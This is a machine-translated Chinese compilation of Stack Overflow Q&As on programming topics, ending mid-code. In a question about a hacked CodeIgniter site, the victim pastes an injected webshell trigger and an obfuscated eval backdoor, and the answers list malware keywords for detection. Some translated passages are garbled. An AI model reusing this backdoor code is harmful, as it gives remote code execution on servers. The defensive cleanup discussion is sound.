请参阅[`liblfds`](http://www.liblfds.org)，无锁 MPMC 环形缓冲区。它根本不会阻塞——无锁数据结构不倾向于这样做，因为无锁的目的是避免阻塞；*您*需要处理这个问题，当数据结构返回给您时，如果您尝试读取空时返回`NULL`-returns `NULL`，但写入完整时不符合您的要求；在这里，它会丢弃最古老的元素，并为您的写作提供它。

但是，只需稍作修改即可获得该行为。

但可能有更好的解决方案。环形缓冲区的棘手部分是当完全获取最旧的先前元素并重新使用它时。你不需要这个。我认为您可以仅使用 SPSC 内存屏障循环缓冲区并使用原子操作重写它。这将比MPMC 环形缓冲区（它是队列和堆栈的组合）中的性能*要高得多。*`liblfds`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-05T05:47:27.013

我想我有你要找的东西。它是一个阻塞生产者/消费者的无锁环形缓冲区实现。你只需要访问原子原语——在这个例子中，我将使用 gcc 的`sync`函数。

它有一个已知的错误——如果缓冲区溢出超过 100%，则不能保证队列保持 FIFO（它最终仍会处理它们）。

此实现依赖于读取/写入缓冲区元素作为原子操作（这几乎可以保证指针）

```
struct ringBuffer
{
   void** buffer;
   uint64_t writePosition;
   size_t size;
   sem_t* semaphore;
}

//create the ring buffer
struct ringBuffer* buf = calloc(1, sizeof(struct ringBuffer));
buf->buffer = calloc(bufferSize, sizeof(void*));
buf->size = bufferSize;
buf->semaphore = malloc(sizeof(sem_t));
sem_init(buf->semaphore, 0, 0);

//producer
void addToBuffer(void* newValue, struct ringBuffer* buf)
{
   uint64_t writepos = __sync_fetch_and_add(&buf->writePosition, 1) % buf->size;

   //spin lock until buffer space available
   while(!__sync_bool_compare_and_swap(&(buf->buffer[writePosition]), NULL, newValue));
   sem_post(buf->semaphore);
}    

//consumer
void processBuffer(struct ringBuffer* buf)
{
   uint64_t readPos = 0;
   while(1)
   {
       sem_wait(buf->semaphore);

       //process buf->buffer[readPos % buf->size]
       buf->buffer[readPos % buf->size] = NULL;
       readPos++;
   }
} 
```

# diff - Perforce diff 按日期排序

> ID：12264105
> 
> 赞同：0
> 
> 时间：2012-09-04T13:05:50.413
> 
> 标签：diff, perforce

*   如何按更改的顺序对 perforce diff 进行排序。
*   我们只能在某个日期之后输出 diff 吗？
*   仅针对某些用户，文件的上述输出的解决方案..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T04:29:11.443

你肯定必须编写一个工具来有效地做到这一点，但这里有一些指示

**p4 更改** [文档](http://www.perforce.com/perforce/doc.current/manuals/cmdref/changes.html#1048020)

此命令允许您列出符合特定条件的每个更改列表，例如`-u user`特定用户、`@date`日期之前的所有内容、在and 、 /depot/location``@date1,@date2`之间提交的任何内容等...查看文档以获取更多信息。`date1``date2``/depot/location' to retrieve only changelists affecting files in`

它将输出格式如下的列表项：

```
Change ChangeNumber on Year/Month/Day by User@WorkspaceName 'Shortened Description' 
```

现在您有了更改列表，您需要查看它们的详细信息，因此解析您的输出`p4 changes`，然后调用`p4 describe`.

**p4 描述** [文档](http://www.perforce.com/perforce/doc.current/manuals/cmdref/describe.html#1040665)

此命令允许您通过提供其 ChangeNumber（来自我们的更改输出）来获取更改列表的描述。

此命令的输出将类似于：

```
Change ChangeNumber by User@WorkspaceName on Year/Month/Day Time
*new line*
*tab*Full Description
*new line*
Affected files ...
*new line*
... //depot/path/file#RevisionNumber operation(add/change/delete...) // repeated for as many files that were in the changelist 
```

**p4 diff2** [文档](http://www.perforce.com/perforce/doc.current/manuals/cmdref/diff2.html#1040665)

现在，此命令将允许您在软件仓库上区分两个修订版。您可以使用标志 sur`-ds`仅提供摘要。不提供修订号将使用`HEAD`修订。

例如，我在文档中添加了 // test 和一个新行，根据之前的版本对其进行测试会得到这种输出

```
==== //depot/path/file#RevisionNumber (text) - //depot/path/file#2ndRevisionNumber (text) ==== content
2a3,4
> // test
> 
```

**p4 差异** [文档](http://www.perforce.com/perforce/doc.current/manuals/cmdref/diff.html#1040665)

`diff`将非常相似，`diff2`但它与机器上的文件不同，如果您有待处理的更改，这很有用。

这应该可以帮助您入门！

# java - Glassfish 3.1，JAXB 计数 IllegalAnnotationExceptions，无详细信息

> ID：12264106
> 
> 赞同：2
> 
> 时间：2012-09-04T13:05:51.270
> 
> 标签：java, jaxb, glassfish-3

我有以下方法：

```
public String getXML() throws JAXBException, FileNotFoundException {
    StringWriter writer = new StringWriter();
    JAXBContext jc = JAXBContext.newInstance(questionSet.getClass());
    Marshaller m = jc.createMarshaller();
    m.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, Boolean.TRUE); // Include indentation and linefeeds
    m.marshal(questionSet, writer);

    return writer.toString();
} 
```

它在 JAXBContext 实例化行上抛出“9 个 IllegalAnnotationExceptions 计数”，该行很好地记录到我的 Glassfish 3.1 日志文件中。但我没有看到关于这些计数的详细信息。有谁知道为什么我可能无法获得详细信息？我需要进行配置更改吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:58:58.477

我永远无法确定为什么详细信息没有显示在日志中。但是，详细信息确实出现在捕获的错误消息中，所以我在那里添加了一个断点，而不是继续与日志争吵。

感谢所有考虑过的人！

# arrays - 如何将多行数组转换为一个有键计数和没有计数的零的数组？

> ID：12264107
> 
> 赞同：-2
> 
> 时间：2012-09-04T13:05:50.817
> 
> 标签：arrays, perl, hash, multidimensional-array, matrix

如果我有一个多行数组，它包含例如以下整数，每行具有不同数量的整数：

```
1 1 1 2 1 1
2 1 4 1
2 1 1 3 1 6 
```

如何将它转换为 perl 中的计数数组，对于没有计数的键为零？我可以使用 map 为单个数组案例做这件事，但我正在努力处理这个多行案例/数组案例的数组。

```
#For line 1, 1 => 5, 2 => 1
#For line 2, 1 => 2, 2 => 1, 4 => 1
#For line 3, 1 => 3, 2 => 1, 3 => 1, 6 => 1 
```

所以结果看起来像这样：

```
5 1 0 0 0 0
2 1 0 1 0 0
3 1 1 0 0 1 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:22:57.860

这似乎可以满足要求。它做了一个显而易见的事情，即构建一个计数哈希数组，然后在哈希的键中找到最大值以构建一个显示

```
use strict;
use warnings;

use feature 'say';

my @data;

while (<DATA>) {
  next unless /\S/;
  my %counts;
  $counts{$_}++ for split;
  push @data, \%counts;
}

my $max = 0;
for (map keys %$_, @data) {
  $max = $_ unless $max >= $_;
}

for my $row (@data) {
  say join ' ', map $row->{$_} // 0, 1 .. $max;
}

__DATA__

1 1 1 2 1 1
2 1 4 1
2 1 1 3 1 6 
```

**输出**

```
5 1 0 0 0 0
2 1 0 1 0 0
3 1 1 0 0 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:39:37.560

ETA：修复了对负矩阵值的支持。假设不会出现浮点数，因为需要零值。

使用多维数组的技巧是记住数组*只能*包含标量值。在这种情况下，每个标量值都是对数组的引用。

如果您的矩阵可以包含正整数以外的其他值，则必须使用散列作为数据存储。

在下面的打印中，我使用[*定义或*运算符](http://perldoc.perl.org/perlop.html#Logical-Defined-Or)来区分未初始化（零）计数。

```
use strict;
use warnings;
use Data::Dumper;
use List::Util qw(max min);

my @a = (
    [qw(1 1 1 2 1 1)],
    [qw(2 1 4 1)],
    [qw(2 1 1 3 1 6)],
);

my @res;
my ($max, $min);

for my $aref (@a) {      # each array element is an array ref
    my %count;
    for (@$aref) {       # the array elements of each ref
        $count{$_}++;    # count the numbers
    }
    $max = max(@$aref, $max // ());
    $min = min(@$aref, $min // ());
    push @res, \%count;
}
for my $href (@res) {
    print join " ", map $href->{$_} // 0, $min .. $max;
    print "\n";
}
print Dumper \@res; 
```

**输出：**

```
5 1 0 0 0 0
2 1 0 1 0 0
3 1 1 0 0 1
$VAR1 = [
          {
            '1' => 5,
            '2' => 1
          },
          {
            '4' => 1,
            '1' => 2,
            '2' => 1
          },
          {
            '6' => 1,
            '1' => 3,
            '3' => 1,
            '2' => 1
          }
        ]; 
```

请注意缺少的零值。可以使用`map`类似于 print 语句中的语句添加这些语句。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:20:55.377

怎么样：

```
use strict;
use warnings;
use Data::Dump qw(dump);

while (<DATA>) {
    chomp;
    my @count = (0) x 7;
    $count[$_]++ for split;
    shift @count;
    dump @count;
}
__DATA__
1 1 1 2 1 1
2 1 4 1
2 1 1 3 1 6 
```

**输出：**

```
(5, 1, 0, 0, 0, 0)
(2, 1, 0, 1, 0, 0)
(3, 1, 1, 0, 0, 1) 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-04T13:16:11.533

```
use warnings;
use strict;
use Data::Dumper;
my @a = ([1, 1, 1, 2, 1, 1], [2, 1, 4, 1], [2, 1, 1, 3, 1, 6]);
my @output = map { 
  my @in = (0, 0, 0, 0, 0, 0);
  $in[$_-1]++ for @$_;
  \@in;
} @a;
print Dumper(\@output), "\n"; 
```

# git - git没有收到来自svn服务器的提交后结果

> ID：12264108
> 
> 赞同：2
> 
> 时间：2012-09-04T13:05:52.023
> 
> 标签：git, svn, hook, git-svn, svn-hooks

我正在使用 git 提交到具有提交后挂钩的 svn 服务器。这个 post commit hook 应该向客户端返回一些文本。当我使用纯 svn 时，钩子工作正常，但 git svn 不显示文本。

谷歌搜索，我无法找到有关 git-svn 集成问题的任何详细信息。有没有其他人遇到过这个问题，如果有，我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T09:34:52.727

这是因为 git-svn 使用的原始`get_commit_editor()`接口只传入了新的修订号、作者和提交日期。 `get_commit_editor2()`提供对错误消息的访问，但它似乎不是一个简单的更改，因为它停止将其他项目作为单独的参数传递并现在提供一个结构。

也许您可以将问题报告给[git 邮件列表](http://git-scm.com/community)，他们可以帮助解决它。他们是一个友好而乐于助人的社区。

# android - 编译ffmpeg库时出错

> ID：12264118
> 
> 赞同：1
> 
> 时间：2012-09-04T13:06:19.540
> 
> 标签：android, windows, ffmpeg

我在我的一个应用程序中使用 ffmpeg 库。在编译它时，我收到以下错误：

```
$ ./build_android.sh
./build_android.sh: line 113: syntax error near unexpected token `$'\r''
'/build_android.sh: line 113: `function build_one 
```

这是我正在使用的脚本：

```
#!/bin/bash
######################################################
# Usage:
# put this script in top of FFmpeg source tree
# ./build_android
# It generates binary for following architectures:
# ARMv6 
# ARMv6+VFP 
# ARMv7+VFPv3-d16 (Tegra2) 
# ARMv7+Neon (Cortex-A8)
# Customizing:
# 1\. Feel free to change ./configure parameters for more features
# 2\. To adapt other ARM variants
# set $CPU and $OPTIMIZE_CFLAGS 
# call build_one
######################################################
NDK=~/C:/android-ndk-r8b
PLATFORM=$NDK/platforms/android-15/arch-arm/
PREBUILT=$NDK/toolchains/arm-linux-androideabi-4.4.3/prebuilt/linux-x86
function build_one
{                                                                             
./configure --target-os=linux \
    --prefix=$PREFIX \
    --enable-cross-compile \
    --extra-libs="-lgcc" \
    --arch=arm \
    --cc=$PREBUILT/bin/arm-linux-androideabi-gcc \
    --cross-prefix=$PREBUILT/bin/arm-linux-androideabi- \
    --nm=$PREBUILT/bin/arm-linux-androideabi-nm \
    --sysroot=$PLATFORM \
    --extra-cflags=" -O3 -fpic -DANDROID -DHAVE_SYS_UIO_H=1 -Dipv6mr_interface=ipv6mr_ifindex -fasm -Wno-psabi -fno-short-enums -fno-strict-aliasing -finline-limit=300 $OPTIMIZE_CFLAGS " \
    --disable-shared \
    --enable-static \
    --extra-ldflags="-Wl,-rpath-link=$PLATFORM/usr/lib -L$PLATFORM/usr/lib -nostdlib -lc -lm -ldl -llog" \
    --disable-everything \
    --enable-demuxer=mov \
    --enable-demuxer=h264 \
    --disable-ffplay \
    --enable-protocol=file \
    --enable-avformat \
    --enable-avcodec \
    --enable-decoder=rawvideo \
    --enable-decoder=mjpeg \
    --enable-decoder=h263 \
    --enable-decoder=mpeg4 \
    --enable-decoder=h264 \
    --enable-parser=h264 \
    --disable-network \
    --enable-zlib \
    --disable-avfilter \
    --disable-avdevice \
    $ADDITIONAL_CONFIGURE_FLAG
}
make clean
make  -j4 install
$PREBUILT/bin/arm-linux-androideabi-ar d libavcodec/libavcodec.a inverse.o
$PREBUILT/bin/arm-linux-androideabi-ld -rpath-link=$PLATFORM/usr/lib -L$PLATFORM/usr/lib  -soname libffmpeg.so -shared -nostdlib  -z,noexecstack -Bsymbolic --whole-archive --no-undefined -o $PREFIX/libffmpeg.so libavcodec/libavcodec.a libavformat/libavformat.a libavutil/libavutil.a libswscale/libswscale.a -lc -lm -lz -ldl -llog  --warn-once  --dynamic-linker=/system/bin/linker $PREBUILT/lib/gcc/arm-linux-androideabi/4.4.3/libgcc.a

#arm v6
#CPU=armv6
#OPTIMIZE_CFLAGS="-marm -march=$CPU"
#PREFIX=./android/$CPU 
#ADDITIONAL_CONFIGURE_FLAG=
#build_one

#arm v7vfpv3
CPU=armv7-a
OPTIMIZE_CFLAGS="-mfloat-abi=softfp -mfpu=vfpv3-d16 -marm -march=$CPU "
PREFIX=./android/$CPU
ADDITIONAL_CONFIGURE_FLAG=
build_one

#arm v7vfp
#CPU=armv7-a
#OPTIMIZE_CFLAGS="-mfloat-abi=softfp -mfpu=vfp -marm -march=$CPU "
#PREFIX=./android/$CPU-vfp
#ADDITIONAL_CONFIGURE_FLAG=
#build_one

#arm v7n
#CPU=armv7-a
#OPTIMIZE_CFLAGS="-mfloat-abi=softfp -mfpu=neon -marm -march=$CPU -mtune=cortex-a8"
#PREFIX=./android/$CPU 
#ADDITIONAL_CONFIGURE_FLAG=--enable-neon
#build_one

#arm v6+vfp
#CPU=armv6
#OPTIMIZE_CFLAGS="-DCMP_HAVE_VFP -mfloat-abi=softfp -mfpu=vfp -marm -march=$CPU"
#PREFIX=./android/${CPU}_vfp 
#ADDITIONAL_CONFIGURE_FLAG=
#build_one 
```

请告诉我它有什么问题？我尝试了很多解决方案，但没有任何效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T17:48:52.120

您是否只是遇到了 unix / dos 文件 (lr/lf) 问题？也许文件上的 dos2unix 会有所帮助？

# contacts - 在哪里可以找到适用于 .NET 的 Google.Apis.Contacts.v3？

> ID：12264119
> 
> 赞同：4
> 
> 时间：2012-09-04T13:06:22.367
> 
> 标签：contacts, google-contacts-api

.NET 有很多不同的 Google API dll，例如 Google.Apis.Calendar.v3。但联系人 API 没有。使用旧版本或其他方法不是解决方案，因为我已经使用了几个 API 的 v3。我需要添加一个联系人 API。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T17:24:03.640

[Google Data API 的 .NET 库](https://code.google.com/p/google-gdata/)支持 Contacts API v3 ：

[https://code.google.com/p/google-gdata/source/browse/#svn%2Ftrunk%2Fclients%2Fcs%2Fsrc%2Fgcontacts](https://code.google.com/p/google-gdata/source/browse/#svn%2Ftrunk%2Fclients%2Fcs%2Fsrc%2Fgcontacts)

要了解有关其用法的更多信息，请查看文档：

[https://developers.google.com/google-apps/contacts/v3/](https://developers.google.com/google-apps/contacts/v3/)

# php - Codeigniter 应用程序被黑，代码注入 index.php

> ID：12264125
> 
> 赞同：12
> 
> 时间：2012-09-04T13:06:34.597
> 
> 标签：php, security, codeigniter, codeigniter-2, code-injection

我有一个不断被黑客入侵的 codeigniter 2.0.2 项目。主要有两个问题：

*   恶意代码被添加到`index.php`文件的开头
*   流氓文件被添加到服务器

根据主机的说法，没有 FTP 日志表明这些文件已上传。

1.  由于没有与流氓文件相关的 FTP 上传日志 - 这是否意味着它必须是通过网站本身的漏洞利用，例如联系人或上传表单？

2.  该站点位于共享主机上-将其作为同一服务器上的站点的代码也被黑客入侵，这是导致问题的原因吗？

3.  如果我将 index.php 的文件名更改为其他名称会有帮助吗？

4.  由于`index.php`正在修改，我应该将其 CHMOD 为 644 吗？

5.  我一直在寻找 codeigniter 项目的建议权限，但还没有任何来源。除了上传/日志目录（777）之外，我在整个站点上都在想 644 - 这听起来好吗？

注入文件顶部的`index.php`代码：

`<?php if(isset($_GET["t6371n"])){ $auth_pass="";$color="#df5";$default_action="FilesMan";$default_use_ajax=true;$default_charset="Windows-`

然后是一个带有长编码字符串的长 preg_replace 语句。接下来是第二条语句：

`if(isset($_GET["w6914t"])){$d=substr(8,1);foreach(array(36,112,61,64,36,95,80,79,83,84,91,39,112,49,39,93,59,36,109,61,115,112,114,105,110,116,102,40,34,37,99,34,44,57,50,41,59,105,102,40,115,116,114,112,111,115,40,36,112,44,34,36,109,36,109,34,41,41,123,36,112,61,115,116,114,105,112,115,108,97,115,104,101,115,40,36,112,41,59,125,111,98,95,115,116,97,114,116,40,41,59,101,118,97,108,40,36,112,41,59,36,116,101,109,112,61,34,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,115,116,121,108,101,46,100,105,115,112,108,97,121,61,39,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,105,110,110,101,114,72,84,77,76,61,39,34,46,97,100,100,99,115,108,97,115,104,101,115,40,104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115,40,111,98,95,103,101,116,95,99,108,101,97,110,40,41,41,44,34,92,110,92,114,92,116,92,92,39,92,48,34,41,46,34,39,59,92,110,34,59,101,99,104,111,40,115,116,114,108,101,110,40,36,116,101,109,112,41,46,34,92,110,34,46,36,116,101,109,112,41,59,101,120,105,116,59)as$c){$d.=sprintf((substr(urlencode(print_r(array(),1)),5,1).c),$c);}eval($d);}`

有一个联系表格和一个表格，用户可以使用 CKFinder 2.0.1 上传项目。打算更新一下，看看能不能解决。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-04T13:18:44.847

你可以做几件事：

*   检查您的日志文件是否有对具有奇怪或不熟悉名称的文件的 POST 请求，例如`.cache_123.php`- 这些可能是后门脚本，尤其是以点开头的文件名，从而将其隐藏在（常规）文件系统之外。
*   下载完整的实时站点并在站点范围内搜索诸如`base64_decode`, `exec`, `preg_replace`, `passthru`, `system`, `shell_exec`, `eval`, 等内容`FilesMan`
*   通过防病毒软件（AVG、Avast、...）运行检查您的整个（下载的实时）站点
*   如果可能，chmod 上传目录 775 而不是 777

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-09-14T11:37:54.730

我知道这是一个旧线程，但我想添加一个选项来确定问题发生的原因和位置。

创建一个每次加载的钩子（无论在哪个阶段）并将 $this->input->post() 和 ->get() 连同类名和方法名一起转储到日志文件中。

这样，您将足够快地看到问题开始的地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:12:29.107

我认为通过 PHP 应用程序而不是 FTP 服务器更容易破解。你有上传表格吗？如果您无法使用 VPS，请尝试让您的主机将其移至另一台共享服务器。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-05T02:43:36.053

我认为您确实需要执行代码审核以找到核心漏洞所在的位置。除非您运行某种完整性检查，否则您无法确定攻击者是否在其他文件中放置了后门。

作为快速修复，我建议您尽可能安装 ModSecurity Apache 模块。接下来，寻找代码中可能发生文件注入的地方（通常是文件上传函数）。

# intellij-idea - 如何在 IntelliJ IDEA / WebStorm 中重新缩进行？

> ID：12264127
> 
> 赞同：39
> 
> 时间：2012-09-04T13:06:45.437
> 
> 标签：intellij-idea, indentation

在 Eclipse 中，我可以选择几行并按下`Ctrl + I`以重新缩进这些行。我如何在 IntelliJ IDEA / WebStorm 中做同样的事情？

笔记：

*   我不想“缩进”或“取消缩进”选定的行 - 这会手动将文本“移动”到右侧或左侧。我希望 IDE 能够巧妙地定位线条。
*   我不想重新格式化任何东西，也就是说，除了每行的第一个非空白字符之外，不应该对字符进行任何修改。

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-09-04T13:29:20.120

`Code`| **自动缩**进行（ Windows 默认键盘映射中的`Ctrl`+ `Alt`+ `I`）。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2015-01-21T14:38:10.647

在 Mac 上，默认为``Ctrl``++ 。``Option````I``

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2016-12-22T20:38:43.890

在mac上对我有用的是

`⌘</kbd> + `OPTION` + `L``

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2017-03-23T07:51:13.023

视窗：

`Ctrl`+ `Alt`+`L`

苹果电脑：

`⌘</kbd> + `OPTION` + `L``

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-03-30T08:55:40.477

在 Webstorm 中，该选项可以在键盘映射中作为“重新格式化代码”找到。Mac 上的默认设置是`Alt` `Cmd` `l`

# html - 用户代理如何区分域和相对 url 中的文件扩展名？

> ID：12264129
> 
> 赞同：3
> 
> 时间：2012-09-04T13:06:55.137
> 
> 标签：html, url, user-agent

假设浏览器遇到这样的链接：

```
<a href='stackoverflowhome.html'>home</a> 
```

这显然是当前目录中 html 文件的相对 url，但是浏览器如何知道 .html 是文件扩展名，而不是 TLD（顶级域）？它是否有常见文件扩展名列表或 TLD 列表？如果是这样，是否在新文件格式变得常用时手动更新，或者当接受的 TLD 列表发生变化时（例如品牌 TLD）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:12:16.793

这是因为这就是[RFC 3986](https://www.rfc-editor.org/rfc/rfc3986#section-4.1)指定应该解析 URI 的方式。如果 URI 没有`scheme`（一组字符后跟冒号 - 例如`http:`或`gopher:`），则必须将其视为相对 URI。引用 RFC：

> URI 引用是 URI 或相对引用。如果 URI 引用的前缀与后跟冒号分隔符的方案的语法不匹配，则 URI 引用是相对引用。

允许用户代理对用户的意思做出最好的猜测（参见[第 4.5 节](https://www.rfc-editor.org/rfc/rfc3986#section-4.5)），尤其是在上下文不明确的情况下（例如浏览器中的 URL 栏），但 RFC 建议不要在 URI 存在的地方使用它很长一段时间，因为用户代理的最佳猜测会随着时间的推移而改变，从而导致 URI 不会根据访问时间或访问它们的用户代理解析为相同的资源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:09:10.833

相对 URL 绝不是域名。

如果 URL 具有协议，则仅将其解析为包含域名。（或者是协议相关的）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:10:24.170

URL 不以协议说明符开头 - no`http://` 或`https://`，因此被解释为相对 URL。

# jquery - 如何为多行级别支持扩展数据表排序功能

> ID：12264132
> 
> 赞同：1
> 
> 时间：2012-09-04T13:07:08.480
> 
> 标签：jquery, datatables

我有下一个表结构：

[表结构图片](http://postimage.org/image/bq53yh8q1/)

如您所见，此表中有一些级别 (3)。我想按级别对该表进行排序：

1.  对第一级进行排序（PC 和手机）
2.  在第一级内部排序第二级（分辨率）
3.  在第二级内部对第三级（操作系统名称）等进行排序。

我从三个对象（object['0']['data']、object['1']['data'] 和 object['2']['data']）组成这个表。

我之前使用了自己的 js 库，但现在需要切换到数据表。

旧代码是这样的

```
//Sort Level 1
    table_data.sort( sorter )

    // Sort Level 2
    for (var i in table_data) {

        table_data[i].data.sort( sorter );

        // Sort Level 3
        for (var j in table_data[i].data) {
            table_data[i].data[j].data.sort( sorter );
        }
    } 
```

如何使用数据表插件实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-11T10:54:47.500

您可以使用[DataTables 进行分组 - 行分组](http://datatables.net/release-datatables/examples/advanced_init/row_grouping.html "数据表 - 行分组")

以及使用 fnSort() 对组列进行排序，请参阅 JSFiddle 上的[示例](http://jsfiddle.net/3BRJF/2/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-30T07:58:48.053

使用 datable 对这些数据进行排序是不正确的，因为它实际上不是一个表格 - 这是一个装饰成表格的树，所以最好使用你自己的 js 库来排序树（或者使用 angularjs 很容易制作）。但是如果你仍然想使用数据表——需要对包含当前数据表数据的aoData对象进行排序。

# c - 链表中的意外输出

> ID：12264140
> 
> 赞同：0
> 
> 时间：2012-09-04T13:07:44.367
> 
> 标签：c, linked-list

有时我问了一个关于链表的问题并得到了很好的答复......现在我已经使用这些建议编写了一个新代码，但我遇到了一个错误。代码是：

```
#include<stdio.h>
#include<stdlib.h>
typedef struct node
{
    int data;
    struct node *next;
}node;
node *mknode()
{
    return malloc(sizeof(node));
}
void create(node* h, int num)
{
    int i;
    node *temp=h;
    for(i=0;i<num;i++)
    {
        temp->data=i;
        if(i==(num-1))
            temp->next=NULL;
        else
            temp->next=mknode();
        temp=temp->next;
    }
}
node* add_end(node *h,int num)
{
    node *temp;
    if(h==NULL)
    {
        h=mknode();
        temp=h;
        create(h,num);
    }
    else
    {
        temp=h;
        while(h!=NULL){
            h=h->next;}
        h=mknode();
        create(h,num);
    }
    return temp;
}
void display(node *h)
{
    node *temp=h;
    while(temp!=NULL)
    {
        printf("%d->",temp->data);
        temp=temp->next;
    }
}
int main()
{
    node *head=NULL;
    int num;
    scanf("%d",&num);
    head=add_end(head,num);
    head=add_end(head,num);
    display(head);
    //printf("%d",list_len(head));
    free(head);
    return 0;
} 
```

现在，由于我为输入 3 调用了 add_end 两次，因此输出应该是 0->1->2->0->1->2-> 但我得到的是 0->1->2->

我已经检查了很多，create 函数中的 FOR 循环对于 n 的输入运行了 2n 次。所以问题是显示函数遇到 NULL 但我无法弄清楚它发生在代码中的哪个位置。

所有帮助表示赞赏。提前致谢 -user1614886

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:32:38.027

在`add_end()`您没有正确链接节点。

```
[blah blah]
else
{
    temp=h;
    while(h!=NULL){
        h=h->next;}
    h=mknode();
    create(h,num);
} 
```

你前进`h`直到它是`NULL`，但你应该只移动到`h->next == NULL`并在那里附加你的下一个列表。

# java - 如何从来自 Google Maps API 的字符串中查找城市名称

> ID：12264141
> 
> 赞同：1
> 
> 时间：2012-09-04T13:07:52.477
> 
> 标签：java, string, substring

我的应用程序中有 2 个文本框。1 用于源地址，另一个用于目标地址。两者都是自动完成文本框，我从 Google Maps API 获取数据。

**源地址**== SHAHIBAUGUNDERBRIDGE,Shahibagh, Ahmedab​​ad **,** Gujarat

**目的地地址**== CGRoad,ShreyasColony,Navrangpura, Ahmedab​​ad **,** Gujarat

现在我想要的是从字符串中找到用户输入的城市名称。我尝试了不同的方法，但我们可以看到地址字符串的格式不固定，我无法获得城市名称。我发现获得城市名称的一个常见问题是它总是在最后一个“，”之前。如您所见，两个字符串中的 City name -> Ahmedab​​ad 在最后一个 (COMMA)"," 之前。但我仍然在努力获得城市名称。如果有人有任何想法，请帮助我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:13:04.577

如果它总是倒数第二个然后尝试

```
String [] vals = source_address.split(",");
String city = vals[vals.length - 2]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:24:56.283

看起来谷歌将地址保存为：

[道路]、[位置名称]、[城市]、[州]。

假设您是正确的，那么城市总是在最后一个“，”之前，那么您可以在字符串上使用 split() 方法。

split 接受一个正则表达式（作为一个字符串）来分割有问题的字符串。但是，您似乎只想拆分“，”

因此，如果您致电：

```
String [] data = myAddress.split(","); // assuming "myAddress" has the Google data 
```

然后你现在在 data 中有一个字符串数组。“，”之间的每个部分都有一个元素。

如果您想访问该数组的倒数第二个元素，则只需：

```
String cityName = data[data.length-2]; // get the 2ed to last element 
```

现在记住，“split()”需要一个正则表达式，所以要注意你传递它的字符串。

# java - 如何在 java 中将 DataFlavor[] 保存为图像文件？

> ID：12264146
> 
> 赞同：1
> 
> 时间：2012-09-04T13:08:06.843
> 
> 标签：java, save, image

考虑到代码：

```
 Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
    DataFlavor[] flavors = cb.getAvailableDataFlavors();
    flavors = cb.getAvailableDataFlavors();
    for (DataFlavor flavor : flavors) {
        System.out.println(flavor);
    }
    BufferedImage buff = //  flavors  <- I don't know what to put here to make it working; 
    File file = new File("newimage.png");
    ImageIO.write(buff,"png", file); 
```

哪个返回：

```
 java.awt.datatransfer.DataFlavor[mimetype=image/x-java-image;representationclass=java.awt.Image] 
```

**如何设置 BufferedImage 行以将其保存为图片**，（比如说 png 文件）？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:11:24.857

```
try {

    Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
    BufferedImage img = (BufferedImage)cb.getData(DataFlavor.imageFlavor);
    File file = new File("newimage.png");
    ImageIO.write(img, "png", file);

} catch (Exception e) { throw new RuntimeException(e); } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:00:08.030

## 代码

```
import java.awt.*;
import java.awt.datatransfer.*;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import javax.swing.*;

import javax.imageio.ImageIO;
import java.io.File;

public class SaveClipboardScreenshot {

    public static void main(String[] args) throws Exception {
        // get the screenshot
        Robot robot = new Robot();
        robot.keyPress(KeyEvent.VK_PRINTSCREEN);
        robot.delay(40);
        robot.keyRelease(KeyEvent.VK_PRINTSCREEN);
        robot.delay(404);

        Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
        DataFlavor[] flavors = cb.getAvailableDataFlavors();
        System.out.println("After: ");
        for (DataFlavor flavor : flavors) {
            System.out.println(flavor);
            if (flavor.toString().indexOf("java.awt.Image")>0) {
                Object o = cb.getData(flavor);
                Image i = (Image)o;
                // ImageIO will not write an Image
                // It will write a BufferedImage (a type of RenderedImage)
                BufferedImage bi = new BufferedImage(
                        i.getWidth(null),
                        i.getHeight(null),
                        BufferedImage.TYPE_INT_RGB);
                Graphics2D g = bi.createGraphics();
                g.drawImage(i, 0, 0, null);
                g.dispose();

                JScrollPane sp = new JScrollPane(new JLabel(new ImageIcon(bi)));
                sp.setPreferredSize(new Dimension(800,600));
